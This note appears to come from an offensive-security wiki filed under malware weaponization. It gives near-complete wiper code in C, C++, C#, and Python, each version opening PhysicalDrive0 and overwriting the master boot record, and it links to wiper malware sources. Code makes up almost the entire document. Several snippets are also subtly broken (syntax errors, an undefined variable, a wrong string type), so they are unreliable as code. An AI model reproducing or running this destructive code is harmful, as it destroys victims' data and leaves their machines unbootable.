# Overwrite MBR

## WinAPI

### C

```c
#include <windows.h>

const unsigned char master_boot_record[512] = {};

void OverwriteMBR() {
	DWORD bytes_written;
	HANDLE handle_device = CreateFileW(
		"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, NULL, NULL
	);
	WriteFile(handle_device, master_boot_record, 512, &bytes_written, NULL);
	CloseHandle(handle_device);
}

INT WINAPI wWinMain(
_In_ HINSTANCE hInstance,
_In_opt_ HINSTANCE PrevInstance,
_In_ PWSTR szCmdLine,
_In_ INT nShowCmd
) {
	OverwriteMBR();
}
```

### C++

Refer to this [[07 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/Malware Development/Assembly/Mayhem/Overwrite MBR|section]] to overwrite it.

```cpp
#include <windows.h>

const unsigned char master_boot_record[] = {
	// insert shellcode bytes to overwrite the masterboot record
};

void OverwriteMBR() {
	DWORD bytes_written;
	HANDLE handle_device = ::CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0
	);
	::WriteFile(handle_device, master_boot_record, 512, &bytes_written, 0);
	::CloseHandle(handle_device);
}

int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
) {
	OverwriteMBR();
}
```

### C\#

```cs
using System;
using System.Runtime.InteropServices;

namespace MBROverwriter {
    public static class OverwriteMBR {
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode,
                                                IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
        
        [DllImport("kernel32")]
        private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
                                             out uint lpNumberBytesWritten, IntPtr lpOverlapped);
        
        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;
        
        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;
        private const uint OpenExisting = 0x3;
        private const uint FileFlagDeleteOnClose = 0x40000000;
        private const uint MbrSize = 512u;
        
        public static void Main(string[] args) {
            var master_boot_record = new byte[] {
                // insert shellcode here
            }
            
            var handle_device = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
                                           OpenExisting, 0, IntPtr.Zero);
            WriteFile(handle_device, master_boot_record, MbrSize, out uint lpNumberBytesWritten, IntPtr.Zero);
            Environment.Exit(-1);
        }
    }
}
```

### Python

#### `pywin32`

```python
from win32gui import * # Windows libraries
from win32ui import * # MessageBox
from win32con import * # MessageBox buttons
from win32file import * # Used to manage files

def main():
    # If pressed no then no warning
    If MessageBox("Warning! This software will overwrite your Master Boot Record! Making your machine unusable. Do you want to continue?", "WARNING!", MB_ICONWARNING | MB_YESNO) == 7:
        return

    If MessageBox("If you read the previous message and understand the risk, press Yes", "LAST WARNING!", MB_ICONWARNING | MB_YESNO) == 7:
        return
    # Start overwriting MBR
    # Replace "False" keyword to "True" to begin the MBR overwrite
    if False:
        # Create a handle to our Physical Drive
        hDevice = CreateFileW("\\\\.\\PhysicalDrive0",              # Path to the physical drive
                                GENERIC_WRITE,                      # Say that we want to write the file!
                                FILE_SHARE_READ | FILE_SHARE_WRITE, # Give ourselves read and write access!
                                None,                               # We'll not have anything as our PySecurity attribute.
                                OPEN_EXISTING,                      # Open the existing file!
                                0,                                  # Prevent errors in Python!
                                0
                                )
        # Overwriting the MBR!
        WriteFile(hDevice,                                          # We want to write to our handle, aka our MBR location
                                AllocateReadBuffer(512),            # Create PyBuffer as Overwrite for our MBR
                                None                                # Nothing as our "ol" parameter
                                )
        # Close the handle to our Physical Drive!
        CloseHandle(hDevice)

if __name__ == '__main__'
    main()

```

#### `ctypes`

```python
import ctypes

kernel32 = ctypes.windll.kernel32

CreateFileW = kernel32.CreateFileW
WriteFile = kernel32.WriteFile
CloseHandle = kernel32.CloseHandle
def OverWriteMBR():
	handle_device = CreateFileW("\\\\.\\PhysicalDrive0", 0x40000000, 0x00000001 | 0x00000002, None, 3, 0,0) 
		WriteFile(handle_device, Data, None)
		CloseHandle(handle_device)
```

---
## References

### Source Repositories

- [MalwareStudio: MBR_OVERWRITER_SOURCE_CODE](https://github.com/MalwareStudio/MBR_OVERWRITER_SOURCE_CODE)

### 0x00sec

- [0x00sec: Python and Malware - Writing a simple wiper malware](https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652)

### Itzsten

- [Itzsten:  How to make MBR overwriting in Python! (Educational purposes)](https://www.youtube.com/watch?v=u012RVBc2RQ)